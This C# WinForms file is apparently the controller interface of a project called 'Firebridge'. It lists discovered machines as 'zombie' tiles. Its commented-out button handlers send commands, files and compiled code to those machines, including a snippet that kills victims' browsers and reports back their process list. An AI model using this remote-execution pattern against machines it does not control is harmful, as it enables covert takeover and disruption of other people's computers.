using FirebridgeShared.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using FirebridgeClient.Controls;
using FirebridgeShared.Models;

namespace FirebridgeClient
{
    public partial class MainView : Form
    {
        public MainView()
        {
            InitializeComponent();

            posY += _devices.Height + margin;
            _devices.ForeColor = ColorTranslator.FromHtml("#f7f1e3");
            this.BackColor = ColorTranslator.FromHtml("#2c2c54");

            DiscoveryClient discoveryClient = new DiscoveryClient();
            discoveryClient.ClientResponded += DiscoveryClient_ClientResponded;
            discoveryClient.Run();


        }

        private const int margin = 30;
        private int posX = margin;
        private int posY = margin;
        private void DiscoveryClient_ClientResponded(object sender, EventArgs e)
        {
            if (posX > 500)
            {
                posX = margin;
                posY += margin + ZombieView.Height;
            }
            else
            {
                var data = (ClientRespondedEventArgs)e;
                var control = new ZombieView(data.Ip);
                control.Location = new Point(posX, posY);
                if (this.InvokeRequired)
                    this.Invoke(new Action(() => { this.Controls.Add(control); }));
                else
                    this.Controls.Add(control);



            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            foreach (Control control in this.Controls)
            {
                switch (control)
                {
                    case ZombieView p:
                        {
                            p.AutoUpdate();
                        }
                        break;
                }
            }
        }

        private void _buttonConsoleSubmit_Click(object sender, EventArgs e)
        {
            // c.SendPacket(new Packet() { Id = 0, Data = _textBoxSubmitText.Text + num + r.Next(500).ToString() });
        }


        private void Button2_Click(object sender, EventArgs e)
        {
            //var f = new OpenFileDialog();
            //if (f.ShowDialog() == DialogResult.OK)
            //{
            //    c.SendPacket(new Packet() { Id = 4, Data = File.ReadAllBytes(f.FileName) });
            //}

        }

        private void Button1_Click(object sender, EventArgs e)
        {
            // c.SendPacket(new Packet() { Id = 2, Data = 70 });
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            // c.SendPacket(new Packet() { Id = 2, Data = 71 });

        }

        private void Button4_Click(object sender, EventArgs e)
        {

            // c.SendPacket(new Packet() { Id = 50, Data = 71 });
        }


        private void Button6_Click(object sender, EventArgs e)
        {
            //            c.SendPacket(new Packet()
            //            {
            //                Id = 1,
            //                Data = new MiniProgramModel()
            //                {
            //                    Code = @"
            //using System;
            //using System.Diagnostics;
            //using System.Linq;
            //using FirebridgeShared.Networking;

            //namespace TestApp
            //{
            //    public static class Program
            //    {
            //        public static void Main(Connection s)
            //        {
            //            Process[] AllProcesses = Process.GetProcesses();
            //            foreach (var process in AllProcesses)
            //            {
            //                if (process.MainWindowTitle != """")
            //                {
            //                    string k = process.ProcessName.ToLower();
            //                    if (k == ""iexplore"" || k == ""iexplorer"" || k == ""chrome"" || k == ""firefox"")
            //                        process.Kill();
            //                }
            //            }

            //           s.SendPacket(new Packet() { Id = 0, Data = String.Join("","", Process.GetProcesses().Select(p => p.ProcessName.ToString()).ToArray())});

            //                }
            //    }
            //}",
            //                    EntryPoint = "TestApp.Program",
            //                    References = new List<string>()
            //                    {
            //                        "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll"
            //                    },
            //                }
            //            });
        }


    }
}
